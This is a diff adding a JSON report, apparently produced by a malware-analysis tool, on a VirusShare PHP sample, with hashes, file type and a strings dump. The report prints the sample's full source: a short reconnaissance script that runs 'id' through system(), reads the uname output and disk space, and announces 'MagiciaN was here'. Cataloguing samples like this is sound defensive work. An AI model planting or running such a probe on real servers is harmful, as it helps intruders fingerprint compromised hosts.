@@ -1,0 +1,63 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "<?php\nfunction ConvertBytes($number) {\n$len = strlen($number);\nif($len < 4) {\nreturn sprintf(\"%d b\", $number); }\nif($len >= 4 && $len <=6) {\nreturn sprintf(\"%0.2f Kb\", $number/1024); }\nif($len >= 7 && $len <=9) {\nreturn sprintf(\"%0.2f Mb\", $number/1024/1024); }\nreturn sprintf(\"%0.2f Gb\", $number/1024/1024/1024); }                          \n\necho \"MagiciaN<br>\";\n$un = @php_uname();\n$id1 = system(id);\n$pwd1 = @getcwd();\n$free1= diskfreespace($pwd1);\n$free = ConvertBytes(diskfreespace($pwd1));\nif (!$free) {$free = 0;}\n$all1= disk_total_space($pwd1);\n$all = ConvertBytes(disk_total_space($pwd1));\nif (!$all) {$all = 0;}\n$used = ConvertBytes($all1-$free1);\n$os = @PHP_OS;\n\necho \"MagiciaN was here ..<br>\";\necho \"uname -a: $un<br>\";\necho \"os: $os<br>\";\necho \"id: $id1<br>\";\necho \"free: $free<br>\";\necho \"used: $used<br>\";\necho \"total: $all<br>\";\nexit;"
+    },
+    "filename": "VirusShare_3b7f24abc379bc3bbb9b1ceb1c849153",
+    "filesize": 884,
+    "filetype": "PHP script, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3b7f24abc379bc3bbb9b1ceb1c849153",
+        "sha1": "71bfea92990c4781a12ce60884128c0ce7773bf8",
+        "sha256": "e15ef789d03e794c8359ed3b15653b074cc905832d503507f0a3d2753b24e32a"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<?php",
+            "function ConvertBytes($number) {",
+            "$len = strlen($number);",
+            "if($len < 4) {",
+            "return sprintf(\"%d b\", $number); }",
+            "if($len >= 4 && $len <=6) {",
+            "return sprintf(\"%0.2f Kb\", $number/1024); }",
+            "if($len >= 7 && $len <=9) {",
+            "return sprintf(\"%0.2f Mb\", $number/1024/1024); }",
+            "return sprintf(\"%0.2f Gb\", $number/1024/1024/1024); }                          ",
+            "echo \"MagiciaN<br>\";",
+            "$un = @php_uname();",
+            "$id1 = system(id);",
+            "$pwd1 = @getcwd();",
+            "$free1= diskfreespace($pwd1);",
+            "$free = ConvertBytes(diskfreespace($pwd1));",
+            "if (!$free) {$free = 0;}",
+            "$all1= disk_total_space($pwd1);",
+            "$all = ConvertBytes(disk_total_space($pwd1));",
+            "if (!$all) {$all = 0;}",
+            "$used = ConvertBytes($all1-$free1);",
+            "$os = @PHP_OS;",
+            "echo \"MagiciaN was here ..<br>\";",
+            "echo \"uname -a: $un<br>\";",
+            "echo \"os: $os<br>\";",
+            "echo \"id: $id1<br>\";",
+            "echo \"free: $free<br>\";",
+            "echo \"used: $used<br>\";",
+            "echo \"total: $all<br>\";",
+            "exit;"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.261591",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
